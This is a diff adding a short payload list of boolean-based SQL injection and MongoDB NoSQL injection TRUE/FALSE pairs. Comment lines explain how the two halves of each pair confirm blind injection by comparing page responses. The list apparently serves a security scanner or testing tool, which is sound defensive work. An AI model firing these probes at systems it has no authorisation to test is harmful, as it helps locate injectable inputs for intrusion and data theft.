@@ -1,0 +1,9 @@
+# boolean-based TRUE/FALSE pairs, one per line, separated by a TAB.
+# TRUE should leave the page like the baseline; FALSE should change it.
+' AND '1'='1	' AND '1'='2
+" AND "1"="1	" AND "1"="2
+ AND 1=1	 AND 1=2
+') AND ('1'='1	') AND ('1'='2
+# NoSQL (MongoDB) boolean pairs
+'||'1'=='1	'||'1'=='2
+' || 'a'=='a	' || 'a'=='b
